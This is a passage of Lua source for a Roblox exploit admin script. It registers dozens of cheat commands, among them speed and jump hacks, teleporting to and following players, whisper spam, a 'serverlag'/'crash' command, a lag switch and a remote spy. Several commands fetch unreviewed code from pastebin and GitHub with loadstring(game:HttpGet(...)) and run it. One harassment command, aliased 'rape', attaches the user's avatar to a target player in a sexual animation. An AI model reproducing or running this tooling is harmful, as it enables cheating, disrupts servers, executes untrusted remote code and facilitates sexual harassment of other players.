		char.Animate.Disabled = true
		wait()
		char.Animate.Disabled = false
		wait()

		if rig == 1 then
			hum2.HipHeight = 0
		elseif rig == 2 then
			hum2.HipHeight = 2.19
		end
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

addcmd('serverlag',{'crash'},function(args, speaker)
	 loadstring(game:GetObjects("rbxassetid://6649537798")[1].Source)()
end)

addcmd('valianthub',{'vh'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/4FXE8r1n"))()
end)

addcmd('sit',{},function(args, speaker)
	speaker.Character:FindFirstChildOfClass("Humanoid").Sit = true
end)

addcmd('sitwalk',{},function(args, speaker)
	local anims = speaker.Character.Animate
	local sit = anims.sit:FindFirstChildOfClass("Animation").AnimationId
	anims.idle:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.walk:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.run:FindFirstChildOfClass("Animation").AnimationId = sit
	anims.jump:FindFirstChildOfClass("Animation").AnimationId = sit
	if r15(speaker) then
		speaker.Character.Humanoid.HipHeight = 0.5
	else
		speaker.Character.Humanoid.HipHeight = -1.5
	end
end)

function noSitFunc()
	wait()
	if Players.LocalPlayer.Character.Humanoid.Sit then
		Players.LocalPlayer.Character.Humanoid.Sit = false
	end
end
addcmd('nosit',{},function(args, speaker)
	if noSit then noSit:Disconnect() nositDied:Disconnect() end
	noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
	local function nositDiedFunc()
		repeat wait() until speaker.Character ~= nil and speaker.Character:FindFirstChild('Humanoid')
		noSit:Disconnect()
		noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
	end
	nositDied = speaker.CharacterAdded:Connect(nositDiedFunc)
end)

addcmd('unnosit',{},function(args, speaker)
	if noSit then noSit:Disconnect() nositDied:Disconnect() end
end)

addcmd('jump',{},function(args, speaker)
	speaker.Character:FindFirstChildOfClass("Humanoid").Jump = true
end)

addcmd('infjump',{'infinitejump'},function(args, speaker)
	infJump = true
end)

addcmd('uninfjump',{'uninfinitejump','noinfjump','noinfinitejump'},function(args, speaker)
	infJump = false
end)

local flyjump
addcmd('flyjump',{},function(args, speaker)
	if flyjump then flyjump:Disconnect() end
	flyjump = UserInputService.JumpRequest:Connect(function(Jump)
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end)
end)

addcmd('unflyjump',{'noflyjump'},function(args, speaker)
	if flyjump then flyjump:Disconnect() end
end)

local HumanModCons = {}
addcmd('autojump',{'ajump'},function(args, speaker)
	local Char = speaker.Character
	local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
	local function autoJump()
		if Char and Human then
			local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
			local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
			if check1 or check2 then
				Human.Jump = true
			end
		end
	end
	autoJump()
	HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
		Char, Human = nChar, nChar:WaitForChild("Humanoid")
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
	end)
end)

addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
	HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
end)

addcmd('edgejump',{'ejump'},function(args, speaker)
	local Char = speaker.Character
	local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
	-- Full credit to NoelGamer06 @V3rmillion
	local state
	local laststate
	local lastcf
	local function edgejump()
		if Char and Human then
			laststate = state
			state = Human:GetState()
			if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
				Char.HumanoidRootPart.CFrame = lastcf
				Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower, Char.HumanoidRootPart.Velocity.Z)
			end
			lastcf = Char.HumanoidRootPart.CFrame
		end
	end
	edgejump()
	HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
		Char, Human = nChar, nChar:WaitForChild("Humanoid")
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
	end)
end)

addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
	HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
end)

addcmd('team',{},function(args, speaker)
	local teamname = nil
	for a,b in pairs(game:GetService("Teams"):GetChildren()) do
		local L_name = b.Name:lower()
		local F = L_name:find(getstring(1))
		if F == 1 then
			teamname = b 
		end
	end
	speaker.Team = teamname
end)

addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants())do
		if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
			v:Destroy()
		end
	end
end)

addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
	for i,v in pairs(speaker.Character:GetDescendants())do
		if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
			v:Destroy()
		end
	end
	local function charPartAdded(part)
		if part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
			wait()
			part:Destroy()
		end
	end
	charPartTrigger = speaker.Character.DescendantAdded:Connect(charPartAdded)
end)

addcmd('unloopnobgui',{'unloopunbgui','unloopnobillboardgui','unloopunbillboardgui','unloopnoname','unlooprohg'},function(args, speaker)
	if charPartTrigger then
		charPartTrigger:Disconnect()
	end
end)

addcmd('spasm',{},function(args, speaker)
	if not r15(speaker) then
		local pchar=speaker.Character
		local AnimationId = "33796059"
		SpasmAnim = Instance.new("Animation")
		SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
		Spasm = pchar.Humanoid:LoadAnimation(SpasmAnim)
		Spasm:Play()
		Spasm:AdjustSpeed(99)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unspasm',{'nospasm'},function(args, speaker)
	Spasm:Stop()
	SpasmAnim:Destroy()
end)

addcmd('headthrow',{},function(args, speaker)
	if not r15(speaker) then
		local AnimationId = "35154961"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = speaker.Character.Humanoid:LoadAnimation(Anim)
		k:Play(0)
		k:AdjustSpeed(1)
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('animation',{'anim'},function(args, speaker)
	if not r15(speaker) then
		local pchar=speaker.Character
		local AnimationId = tostring(args[1])
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = pchar.Humanoid:LoadAnimation(Anim)
		k:Play()
		if args[2] then
			k:AdjustSpeed(tostring(args[2]))
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('noanim',{},function(args, speaker)
	speaker.Character.Animate.Disabled = true
end)

addcmd('reanim',{},function(args, speaker)
	speaker.Character.Animate.Disabled = false
end)

addcmd('animspeed', {},function(args, speaker)
	local Char = speaker.Character
	local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

	for i,v in next, Hum:GetPlayingAnimationTracks() do
		v:AdjustSpeed(tonumber(args[1] or 1))
	end
end)

addcmd('stopanimations', {'stopanims','stopanim'},function(args, speaker)
	local Char = speaker.Character
	local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

	for i,v in next, Hum:GetPlayingAnimationTracks() do
		v:Stop()
	end
end)

addcmd('refreshanimations', {'refreshanimation','refreshanims','refreshanim','reanim'},function(args, speaker)
	local Char = speaker.Character
	local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
	local Animate = Char and Char.FindFirstChild(Char, "Animate")
	Animate.Disabled = true
	for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
		v.Stop(v, 0)
	end
	Animate.Disabled = false
end)

addcmd('loopanimation', {'loopanim'},function(args, speaker)
	local Char = speaker.Character
	local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
	for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
		v.Looped = true
	end
end)

addcmd('owlhub',{'oh'},function(args, speaker)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)

addcmd('tweentpposition',{'ttppos'},function(args, speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = speaker.Character
	if char and getRoot(char) then
		game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
	end
end)

addcmd('offset',{},function(args, speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = speaker.Character
	if char and getRoot(char) then
		getRoot(char).CFrame = getRoot(char).CFrame + Vector3.new(tpX,tpY,tpZ)
	end
end)

addcmd('tweenoffset',{'toffset'},function(args, speaker)
	if #args < 3 then return end
	local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
	local char = speaker.Character
	if char and getRoot(char) then
		game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
	end
end)

addcmd('clickteleport',{},function(args, speaker)
	if speaker == Players.LocalPlayer then
		notify('Click TP','Go to Settings>Keybinds>Add to set up click tp')
	end
end)

addcmd('clickdelete',{},function(args, speaker)
	if speaker == Players.LocalPlayer then
		notify('Click Delete','Go to Settings>Keybinds>Add to set up click delete')
	end
end)

addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local char = Players[v].Character
		if char and getRoot(char) then
			local pos = tostring(getRoot(char).Position)
			notify('Current Position',pos)
		end
	end
end)

addcmd('copyposition',{'copypos'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local char = Players[v].Character
		if char and getRoot(char) then
			local pos = tostring(getRoot(char).Position)
			toClipboard(pos)
		end
	end
end)

addcmd('lagswitch',{'ls'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/HVsL7JsH"))()
end)

addcmd('speed',{'ws','walkspeed'},function(args, speaker)
	if args[2] then
		local speed = args[2] or 16
		if isNumber(speed) then
			speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
		end
	else
		local speed = args[1] or 16
		if isNumber(speed) then
			speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
		end
	end
end)

addcmd('loopspeed',{'loopws'},function(args, speaker)
	local speed = args[1] or 16
	if args[2] then
		speed = args[2] or 16
	end
	if isNumber(speed) then
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		local function WalkSpeedChange()
			if Char and Human then
				Human.WalkSpeed = speed
			end
		end
		WalkSpeedChange()
		HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
		HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			WalkSpeedChange()
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
		end)
	end
end)

addcmd('unloopspeed',{'unloopws'},function(args, speaker)
	HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or nil
	HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or nil
end)

addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
	local jpower = args[1] or 50
	if isNumber(jpower) then
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		local function JumpPowerChange()
			if Char and Human then
				Human.JumpPower = jpower
			end
		end
		JumpPowerChange()
		HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
		HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			JumpPowerChange()
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
		end)
	end
end)

addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
	HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or nil
	HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or nil
end)

addcmd('tools',{'gears'},function(args, speaker)
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
			end
			copy(c)
		end
	end
	copy(game:GetService("Lighting"))
	local function copy(instance)
		for i,c in pairs(instance:GetChildren())do
			if c:IsA('Tool') or c:IsA('HopperBin') then
				c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
			end
			copy(c)
		end
	end
	copy(game:GetService("ReplicatedStorage"))
	notify('Tools','Copied tools from ReplicatedStorage and Lighting')
end)

addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
	for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:Destroy()
		end
	end
	for i,v in pairs(speaker.Character:GetDescendants()) do
		if v:IsA('Tool') or v:IsA('HopperBin') then
			v:Destroy()
		end
	end
end)

addcmd('heal',{},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/GmbrsEjM"))()
end)

addcmd('damage',{},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/GmbrsEjM"))()
end)

addcmd('explorer',{'dex'},function(args, speaker)
		local Dex = game:GetObjects("rbxassetid://3567096419")[1]
	Dex.Parent = PARENT

	local function Load(Obj, Url)
		local function GiveOwnGlobals(Func, Script)
			local Fenv = {}
			local RealFenv = {script = Script}
			local FenvMt = {}
			FenvMt.__index = function(a,b)
				if RealFenv[b] == nil then
					return getfenv()[b]
				else
					return RealFenv[b]
				end
			end
			FenvMt.__newindex = function(a, b, c)
				if RealFenv[b] == nil then
					getfenv()[b] = c
				else
					RealFenv[b] = c
				end
			end
			setmetatable(Fenv, FenvMt)
			setfenv(Func, Fenv)
			return Func
		end
		local function LoadScripts(Script)
			if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
				spawn(function()
					GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script)()
				end)
			end
			for i,v in pairs(Script:GetChildren()) do
				LoadScripts(v)
			end
		end
		LoadScripts(Obj)
	end

	Load(Dex)
end)

addcmd('remotespy',{'rspy'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/yJzq5ceV"))()
end)

addcmd('audiologger',{'alogger'},function(args, speaker)
	notify("Loading",'Hold on a sec')
	loadstring(game:HttpGet(('https://pastebin.com/raw/GmbrsEjM'),true))()
end)

local loopgoto = nil
addcmd('loopgoto',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		loopgoto = nil
		if speaker.Character:FindFirstChild("Humanoid") then
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
		end
		wait()
		loopgoto = Players[v]
		local distance = 3
		if args[2] and isNumber(args[2]) then
			distance = args[2]
		end
		local lDelay = 0
		if args[3] and isNumber(args[3]) then
			lDelay = args[3]
		end
		repeat
			if Players:FindFirstChild(v) then
				if Players[v].Character ~= nil then
					getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(distance,1,0)
				end
				wait(lDelay)
			else
				loopgoto = nil
			end
		until loopgoto ~= Players[v]
	end
end)

addcmd('unloopgoto',{'noloopgoto'},function(args, speaker)
	loopgoto = nil
end)

addcmd('headsit',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true
		headSit = game:GetService("RunService").Heartbeat:Connect(function()
			if Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) then
				if Players:FindFirstChild(Players[v].Name) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
					getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
				else
					headSit:Disconnect()
				end
			end
		end)
	end
end)

addcmd('zyrexhub',{'zh'},function(args, speaker)
	_G.Toggle_GUI = Enum.KeyCode.RightControl

loadstring(game:HttpGet(("https://raw.githubusercontent.com/NotZyrex/Zyrex-Hub/master/Main.lua"),true))()
end)

spamming = false
spamspeed = 1
addcmd('unamedesp',{'ue'},function(args, speaker)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua"))()
end)

addcmd('shotgun',{'shotty'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/rZ4pBbZr"))()
end)

addcmd('whisper',{'pm'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			local plrName = Players[v].Name
			local pmstring = getstring(2)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmstring, "All")
		end)
	end
end)

pmspamming = {}
addcmd('pmspam',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			local plrName = Players[v].Name
			if FindInTable(pmspamming, plrName) then return end
			table.insert(pmspamming, plrName)
			local pmspamstring = getstring(2)
			repeat
				if Players:FindFirstChild(v) then
					wait(spamspeed)
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmspamstring, "All")
				else
					for a,b in pairs(pmspamming) do if b == plrName then table.remove(pmspamming, a) end end
				end
			until not FindInTable(pmspamming, plrName)
		end)
	end
end)

addcmd('guns',{},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/rZ4pBbZr"))()

	loadstring(game:HttpGet("https://pastebin.com/raw/wM5L75bY"))()

	loadstring(game:HttpGet("https://pastebin.com/raw/sEAayemX"))()
end)

addcmd('ak',{'ak47'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/wM5L75bY"))()
end)

bubblechatting = false
local getBubblechat
addcmd('bubblechat',{},function(args, speaker)
	if bubblechatting then return end
	bubblechatting = true
	if getBubblechat then getBubblechat:Disconnect() end
	getBubblechat = Players.PlayerAdded:Connect(function(plr)
		local chatfunc
		chatfunc = plr.Chatted:Connect(function(chat)
			if bubblechatting == true then
				game:GetService("Chat"):Chat(plr.Character.Head,chat,Enum.ChatColor.White)
			else
				chatfunc:Disconnect()
			end
		end)
	end)
	for i,v in pairs(Players:GetPlayers()) do
		local chatfunc
		chatfunc = v.Chatted:Connect(function(chat)
			if bubblechatting == true then
				game:GetService("Chat"):Chat(v.Character.Head,chat,Enum.ChatColor.White)
			else
				chatfunc:Disconnect()
			end
		end)
	end
end)

addcmd('unbubblechat',{'nobubblechat'},function(args, speaker)
	bubblechatting = false
	if getBubblechat then getBubblechat:Disconnect() end
end)

addcmd('safechat',{},function(args, speaker)
	speaker.SetSuperSafeChat(true)
end)

addcmd('nosafechat',{'disablesafechat','unsafechat'},function(args, speaker)
	speaker.SetSuperSafeChat(false)
end)

addcmd('blockhead',{},function(args, speaker)
	speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
end)

addcmd('blockhats',{},function(args, speaker)
	for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
		for i,c in pairs(v:GetDescendants()) do
			if c:IsA("SpecialMesh") then
				c:Destroy()
			end
		end
	end
end)

addcmd('blocktool',{},function(args, speaker)
	for _,v in pairs(speaker.Character:GetChildren()) do
		if v:IsA("Tool") or v:IsA("HopperBin") then
			for i,c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
					c:Destroy()
				end
			end
		end
	end
end)

addcmd('creeper',{},function(args, speaker)
	if r15(speaker) then
		speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
		speaker.Character.LeftUpperArm:Destroy()
		speaker.Character.RightUpperArm:Destroy()
		speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
	else
		speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
		speaker.Character["Left Arm"]:Destroy()
		speaker.Character["Right Arm"]:Destroy()
		speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
	end
end)

addcmd('bang',{'rape'},function(args, speaker)
	if not r15(speaker) then
		execCmd('unbang')
		wait()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = "rbxassetid://148840371"
			bang = speaker.Character.Humanoid:LoadAnimation(bangAnim)
			bang:Play(.1, 1, 1)
			if args[2] then
				bang:AdjustSpeed(args[2])
			else
				bang:AdjustSpeed(3)
			end
			local bangplr = Players[v].Name
			bangDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				bangLoop:Disconnect()
				bang:Stop()
				bangAnim:Destroy()
				bangDied:Disconnect()
			end)
			bangLoop = game:GetService('RunService').Stepped:Connect(function()
				pcall(function()
					getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[bangplr].Character).CFrame
				end)
			end)
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('unbang',{'unrape'},function(args, speaker)
	if bangLoop then
		bangLoop:Disconnect()
		bangDied:Disconnect()
		bang:Stop()
		bangAnim:Destroy()
	end
end)

addcmd('carpet',{},function(args, speaker)
	if not r15(speaker) then
		execCmd('uncarpet')
		wait()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			carpetAnim = Instance.new("Animation")
			carpetAnim.AnimationId = "rbxassetid://282574440"
			carpet = speaker.Character.Humanoid:LoadAnimation(carpetAnim)
			carpet:Play(.1, 1, 1)
			local carpetplr = Players[v].Name
			carpetDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				carpetLoop:Disconnect()
				carpet:Stop()
				carpetAnim:Destroy()
				carpetDied:Disconnect()
			end)
			carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
				pcall(function()
					getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[carpetplr].Character).CFrame
				end)
			end)
		end
	else
		notify('R6 Required','This command requires the r6 rig type')
	end
end)

addcmd('uncarpet',{'nocarpet'},function(args, speaker)
	if carpetLoop then
		carpetLoop:Disconnect()
		carpetDied:Disconnect()
		carpet:Stop()
		carpetAnim:Destroy()
	end
end)

addcmd('friend',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		speaker:RequestFriendship(v)
	end
end)

addcmd('unfriend',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		speaker:RevokeFriendship(v)
	end
end)

addcmd('bringpart',{},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			v.CFrame = getRoot(speaker.Character).CFrame
		end
	end
end)

addcmd('bringpartclass',{'bpc'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
			v.CFrame = getRoot(speaker.Character).CFrame
		end
	end
end)

gotopartDelay = 0.1
addcmd('gotopart',{'topart'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			getRoot(speaker.Character).CFrame = v.CFrame
		end
	end
end)

addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
		end
	end
end)

addcmd('gotopartclass',{'gpc'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			getRoot(speaker.Character).CFrame = v.CFrame
		end
	end
end)

addcmd('tweengotopartclass',{'tgpc'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
		end
	end
end)

addcmd('gotomodel',{'tomodel'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			getRoot(speaker.Character).CFrame = v:GetModelCFrame()
		end
	end
end)

addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
			if speaker.Character:FindFirstChild("Humanoid") then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			end
			wait(gotopartDelay)
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v:GetModelCFrame()}):Play()
		end
	end
end)

addcmd('gotopartdelay',{},function(args, speaker)
	local gtpDelay = args[1] or 0.1
	if isNumber(gtpDelay) then
		gotopartDelay = gtpDelay
	end
end)

addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("ClickDetector") then
			v.MaxActivationDistance = math.huge
		end
	end
end)

addcmd('trail',{'front'},function(args, speaker)
	 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").Character.HumanoidRootPart.CFrame + game:GetService("Players").Character.HumanoidRootPart.CFrame.lookVector * 5
end)

simRadius = false
addcmd('simulationradius',{'sr'},function(args, speaker)
	if sethidden then		
		simRadLoop = game:GetService('RunService').Stepped:Connect(function()
			if setsimulation then
				setsimulation(1e308, 1/0)
			else	
				sethidden(speaker,"MaximumSimulationRadius",1/0)
				sethidden(speaker,"SimulationRadius", 1e308)
			end
		end)
		simRadius = true
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

addcmd('nosimulationradius',{'nsr','unsimradius'},function(args, speaker)
	if sethidden then		
		if simRadLoop then simRadLoop:Disconnect() end
		wait()
		if setsimulation then
			setsimulation(139,139)
		else	
			sethidden(speaker,"MaximumSimulationRadius",139)
			sethidden(speaker,"SimulationRadius", 139)
		end
		simRadius = false
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

addcmd('grabtools',{'gtools'},function(args, speaker)
	for i,v in pairs(workspace:GetChildren()) do
		spawn(function()
